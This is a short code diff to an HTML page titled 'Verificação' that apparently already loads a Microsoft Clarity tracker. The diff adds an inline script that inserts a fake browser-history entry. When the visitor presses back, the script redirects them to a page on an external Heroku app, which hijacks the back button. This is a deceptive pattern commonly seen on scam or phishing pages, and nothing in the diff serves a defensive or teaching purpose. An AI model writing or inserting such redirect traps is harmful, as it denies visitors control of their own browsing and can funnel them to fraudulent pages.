@@ -35,6 +35,18 @@
         })(window, document, "clarity", "script", "l310i69cic");
     </script>
 
+    <script>
+	(function() {
+    if (window.history && window.history.pushState) {
+        window.history.pushState('forward', null, window.location.href);
+
+        window.onpopstate = function() {
+            window.location.href = 'https://projeto-s-354cda5b1f33.herokuapp.com/pages/index.html';
+        };
+    }
+})();
+	</script>
+
     <title>Verificação</title>
 </head>
 
